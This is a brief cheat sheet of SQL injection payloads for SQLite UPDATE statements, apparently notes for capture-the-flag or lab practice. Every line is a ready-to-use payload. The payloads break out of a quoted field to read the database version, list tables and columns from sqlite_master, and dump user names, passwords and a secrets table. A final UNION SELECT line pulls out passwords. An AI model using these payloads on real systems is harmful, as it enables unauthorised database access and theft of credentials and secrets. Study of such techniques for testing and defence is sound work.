for update queries:

to find version:
',nickName=sqlite_version(),email='

to list table names:
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='

to list column from table:
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='

to dump information:
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
',nickName=(SELECT group_concat(secret) from secrets),email='

' UNION SELECT 1,group_concat(password) FROM users -- -

